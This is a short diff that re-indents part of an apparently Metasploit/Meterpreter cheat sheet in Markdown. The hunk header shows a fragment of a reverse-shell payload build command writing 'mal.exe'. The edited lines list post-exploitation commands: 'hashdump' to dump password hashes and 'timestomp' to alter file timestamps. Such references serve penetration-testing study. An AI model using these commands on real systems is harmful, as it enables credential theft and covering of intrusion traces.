@@ -185,12 +185,12 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
 
 - ##### Additional Modules:
 
-  - `use [module]` : Load the specified module
+    - `use [module]` : Load the specified module
     
-    - Examples:
+      - **Examples**:
 
-      -  `use priv` : Load the priv module
+        -  `use priv` : Load the priv module
 
-      - `hashdump` : Dump the hashes from the box
+        - `hashdump` : Dump the hashes from the box
 
-      - `timestomp` : Alter NTFS file timestamps
+        - `timestomp` : Alter NTFS file timestamps
